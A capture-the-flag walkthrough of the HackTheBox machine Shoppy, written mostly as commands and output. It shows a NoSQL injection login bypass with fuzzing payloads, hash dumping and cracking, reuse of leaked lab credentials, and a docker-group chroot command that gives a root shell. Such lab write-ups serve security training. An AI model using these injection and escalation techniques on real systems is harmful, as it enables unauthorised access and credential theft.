---
title: "Walk-through of Shoppy from HackTheBox"
header:
  teaser: /assets/images/2023-01-13-15-39-46.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
---

[Shoppy](https://www.hackthebox.com/home/machines/profile/496) is an easy level machine by [lockscan](https://www.hackthebox.com/home/users/profile/217870) on [HackTheBox](https://www.hackthebox.com/home). It's a Linux box looking at NoSQL injections and Docker exploits.

## Machine Information

![support](/assets/images/2023-01-13-15-39-46.png)

This was a pretty simple box. It featured NoSQL injections, hash dumping, and exploitation of a custom binary to retrieve credentials for privilege escalation. From there we moved laterally then finally used a Docker exploit to spawn a root shell.

<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Easy - Shoppy](https://www.hackthebox.com/home/machines/profile/496) |
| Machine Release Date | 17th September 2022 |
| Date I Completed It | 13th January 2023 |
| Distribution Used | Kali 2022.4 – [Release Info](https://www.kali.org/blog/kali-linux-2022-4-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root㉿kali)-[~]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.180 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)

┌──(root㉿kali)-[~]
└─# nmap -p$ports -sC -sV -oA shoppy 10.10.11.180
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-13 15:57 GMT
Nmap scan report for 10.10.11.180
Host is up (0.029s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Fri, 13 Jan 2023 15:58:11 GMT
<SNIP>
|_    go_gc

1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 101.39 seconds
```

We have a couple of ports open, and we can see a redirect to shoppy.htb. Let's add that to our hosts file:

```sh
┌──(root㉿kali)-[~]
└─# echo "10.10.11.180 shoppy.htb" >> /etc/hosts
```

Now have a look at the website:

![shoppy-website](/assets/images/2023-01-13-16-06-37.png)

There's nothing here. If we try with curl to see the headers we find nothing useful:

```sh
┌──(root㉿kali)-[~/htb/shoppy]
└─# curl -i http://shoppy.htb
HTTP/1.1 200 OK
Server: nginx/1.23.1
Date: Sat, 21 Jan 2023 16:32:54 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 2178
Connection: keep-alive
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Tue, 01 Feb 2022 09:38:44 GMT
ETag: W/"882-17eb4a698a0"
```

If we try with a non-existent sub folder we get an error message:

```sh
┌──(root㉿kali)-[~/htb/shoppy]
└─# curl http://shoppy.htb/pencer
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /pencer</pre>
</body>
</html>
```

If we paste that in to Google we get a clue that this is probably a NodeJS app:

![shoppy-google](/assets/images/2023-01-21-16-36-58.png)

## Gobuster

Let's use gobuster to look for hidden subfolders:

```sh
┌──(root㉿kali)-[~]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://shoppy.htb 
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/01/13 16:15:26 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]
/admin                (Status: 302) [Size: 28] [--> /login]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/Login                (Status: 200) [Size: 1074]
/js                   (Status: 301) [Size: 171] [--> /js/]
/fonts                (Status: 301) [Size: 177] [--> /fonts/]
/Admin                (Status: 302) [Size: 28] [--> /login]
/exports              (Status: 301) [Size: 181] [--> /exports/]
Progress: 87508 / 87665 (99.82%)
===============================================================
2023/01/13 16:22:51 Finished
===============================================================
```

We see a few, with login and admin which redirects to login being of interest. Let's have a look:

![shoppy-login](/assets/images/2023-01-13-16-24-30.png)

We have a login page. The source code reveals nothing so we can assume this is either brute force or SQL injection. A Google of "nodejs database" shows us it could be MySQL or MongoDB. We've done plenty of SQLi in the past, [Shared](https://pencer.io/ctf/ctf-htb-shared) and [Faculty](https://pencer.io/ctf/ctf-htb-faculty) from last year spring to mind.

## NoSQL Injection

I got no where with SQLi and spent some time looking for resources to attack [MongoDB with NodeJS](https://www.mongodb.com/nodejs-database). [This](https://nullsweep.com/a-nosql-injection-primer-with-mongo/) from Null Sweep turned out to be the one to help. I had a look in seclists:

```sh
┌──(root㉿kali)-[~/htb/shoppy]
└─# grep -r 1==1 *                          
NoSQL.txt:|| 1==1

┌──(root㉿kali)-[~/htb/shoppy]
└─# wc -l /usr/share/seclists/Fuzzing/Databases/NoSQL.txt
22 /usr/share/seclists/Fuzzing/Databases/NoSQL.txt
```

There's a NoSQL one with 22 variations, including those mentioned by Null Sweep, so time to fire up Burp. First capture a login request and send to Intruder, notice I added the username of admin in front of the fuzz variable:

![shoppy-burp-intruder](/assets/images/2023-01-21-16-28-41.png)

Load the Seclist NoSQL payload in:

![shoppy-burp=intruder=payload](/assets/images/2023-01-21-16-29-20.png)

Start the attack and eventually find that one of them gives you a redirect to admin:

![shoppy-burp-intruder-attack](/assets/images/2023-01-21-16-31-01.png)

We can check it with curl as well, make sure you escape the apostrophe's:

```sh
┌──(root㉿kali)-[~/htb/shoppy]
└─# curl --data-binary $'username=admin\'||\'a\'==\'a&password=admin' http://shoppy.htb/login
Found. Redirecting to /admin
```

We could have used wfuzz instead of Burp to look for the NoSQLi if we had wanted as well:

```sh
┌──(root㉿kali)-[~/htb/shoppy]
└─# wfuzz -v -c -z file,/usr/share/seclists/Fuzzing/Databases/NoSQL.txt -d "username=adminFUZZ&password=admin" http://shoppy.htb/login
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://shoppy.htb/login
Total requests: 22
==============================================================================================================
ID         C.Time  Response  Lines  Word  Chars  Server         Redirect                       Payload
==============================================================================================================
000000019: 0.084s  400       0 L    2 W   11 Ch  nginx/1.23.1                                  "[$ne]=1"
000000022: 0.138s  302       0 L    4 W   51 Ch  nginx/1.23.1   /login?error=WrongCredentials  "{$nin: [""]}}"
000000018: 0.142s  302       0 L    4 W   51 Ch  nginx/1.23.1   /login?error=WrongCredentials  "{"$gt": ""}"
000000006: 0.036s  302       0 L    4 W   51 Ch  nginx/1.23.1   /login?error=WrongCredentials  "{ $ne: 1 }"
000000012: 0.032s  302       0 L    4 W   28 Ch  nginx/1.23.1   /admin                         "' || 'a'=='a"
```

From the Wfuzz output we can see the last payload worked and we were redirected to /admin just like it did with Burp.

If we login through Firefox we see a simple single page app:

![shoppy-app](/assets/images/2023-01-22-14-58-33.png)

There's nothing here but a search button to look for users, click that and enter our admin user, then click the download export button:

![shoppy-admin-json](/assets/images/2023-01-22-15-01-40.png)

We have the hash of the admin password, but trying to crack it with John or on [CrackStation](https://crackstation.net/) doesn't work. However if we paste admin with our NoSQLi appended the same as we used to login **(admin' || 'a'=='a)** we get something more interesting:

![shoppy-both-json](/assets/images/2023-01-22-15-08-27.png)

Our NoSQLi bypass also works on the search so we can see all users. This time the password can be cracked:

![shoppy-pass-crack](/assets/images/2023-01-22-15-07-35.png)

Logging in to the app as Josh works, but we there is nothing more to look at in there.

## Mattermost

Let's go back to more enumeration and look for subdomains with wfuzz:

```sh
┌──(root㉿kali)-[~/htb/shoppy]
└─# wfuzz -c --hc=404,301 -t 200 -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt -u http://shoppy.htb -H "Host:FUZZ.shoppy.htb"
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://shoppy.htb/
Total requests: 648201
=====================================================================
ID           Response   Lines    Word       Chars      Payload
=====================================================================
000000002:   200        0 L      141 W      3122 Ch     "mattermost"
```

We found a subdomain, let's add it to out hosts file:

```sh
┌──(root㉿kali)-[~]
└─# sed -i '/10.10.11.180 shoppy.htb/ s/$/ mattermost.shoppy.htb/' /etc/hosts
```

If we have a look we find a login page, and our credentials for Josh work:

![shoppy-mattermost](/assets/images/2023-01-22-16-55-35.png)

Now we are inside [Mattermost](https://mattermost.com/) which is a collaboration platform. There's not a lot here, apart from a cat picture, and some talk about developing a password manager. In the Deploy Machine channel we find credentials:

![shoppy-deploy-creds](/assets/images/2023-01-22-17-01-15.png)

## User Flag

These work if we try to SSH in with jaeger and Sh0ppyBest@pp!:

```sh
┌──(root㉿kali)-[~/htb/shoppy]
└─# ssh jaeger@shoppy.htb                                 
jaeger@shoppy.htbs password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jaeger@shoppy:~$
```

Let's grab the user flag:

```sh
jaeger@shoppy:~$ cat user.txt 
c3953863c6dccf6fadc1b32df5dbcd0f
```

## Password Manager

Just like we always do, first a few simple checks before we pull LinPEAS or similar over. SUDO is number one, especially on Easy boxes:

```sh
jaeger@shoppy:~$ sudo -l
[sudo] password for jaeger: 
Matching Defaults entries for jaeger on shoppy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
```

Unsurprisingly we find our user jaeger can run something as a different user. This time it's the password manager that was mentioned earlier.

We can run it but find it doesn't do a lot:

```sh
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!
Please enter your master password: password
Access denied! This incident will be reported !
```

Before we pull the binary down to Kali to have a look with Ghidra or IDA we can first check if anything is leaked using strings:

```sh
jaeger@shoppy:~$ strings /home/deploy/password-manager
/lib64/ld-linux-x86-64.so.2
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
_ZNSaIcED1Ev
_ZNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEC1Ev
_ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_
_ZSt3cin
<SNIP>
```

Nothing interesting with the default encoding, but always remember to check the others, like we did on [Scrambled](https://pencer.io/ctf/ctf-htb-scrambled).

If you look at the options you'll see the choices:

```sh
-e --encoding={s,S,b,l,B,L} Select character size and endianness:
            s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit
```

We can do a simple loop in bash to try all encodings, then have a look at the output:

```sh
jaeger@shoppy:~$ array=( s S b l B L )
jaeger@shoppy:~$ for i in "${array[@]}"; do strings -e"$i" /home/deploy/password-manager; done
/lib64/ld-linux-x86-64.so.2
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
_ZNSaIcED1Ev
<SNIP>
.dynamic
.got.plt
.data
.bss
.comment
���o
���o
���o
Sample
Sample
```

That repeated word is interesting, if we check we see it's the only output from 16-bit encoding (that's b or l):

```sh
jaeger@shoppy:~$ strings --encoding=b /home/deploy/password-manager
Sample
```

If we try that with the program we get a result:

```sh
jaeger@shoppy:~$ sudo -u deploy /home/deploy/password-manager
[sudo] password for jaeger: 
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

## Deploy User

We have creds for the deploy user, let's drop out of this session and start one as that user:

```sh
┌──(root㉿kali)-[~/htb/shoppy]
└─# ssh deploy@shoppy.htb
deploy@shoppy.htbs password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
Last login: Thu Jan 26 08:00:10 2023 from 10.10.14.42
```

Looking at the user we see we're in a group called docker:

```sh
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

That should get your spidey senses tingling!

## Docker

If you need a cheat sheet, [this](https://dockerlabs.collabnix.com/docker/cheatsheet/) is a good one. We can have a look at the installed version of docker, containers and images:

```sh
$ docker version
Client: Docker Engine - Community
 Version:           20.10.18
 API version:       1.41
 Go version:        go1.18.6
 Git commit:        b40c2f6
 Built:             Thu Sep  8 23:12:08 2022
 OS/Arch:           linux/amd64
 Context:           default
 Experimental:      true

Server: Docker Engine - Community
 Engine:
  Version:          20.10.18
  API version:      1.41 (minimum version 1.12)
  Go version:       go1.18.6
  Git commit:       e42327a
  Built:            Thu Sep  8 23:09:59 2022
  OS/Arch:          linux/amd64
  Experimental:     false
 containerd:
  Version:          1.6.8
  GitCommit:        9cd3357b7fd7218e4aec3eae239db1f68a5a6ec6
 runc:
  Version:          1.1.4
  GitCommit:        v1.1.4-0-g5fd4c4d
 docker-init:
  Version:          0.19.0
  GitCommit:        de40ad0
     
$ docker ps
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES

$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   6 months ago   5.53MB
```

So we can see there are no containers running currently but we have an image called alpine. There's a well known exploit that GTFOBins covers [here](https://gtfobins.github.io/gtfobins/docker/), from there we can spawn a root shell using this:

```sh
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

## Root Flag

We don't need sudo because our user already has rights:

```sh
$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
```

Let's grab the root flag:

```sh
# cd root
# cat root.txt
f2348e2be3d1990f4a8429f60461f735
```

All done. That was a nice simple box, hope you learnt something and see you next time.
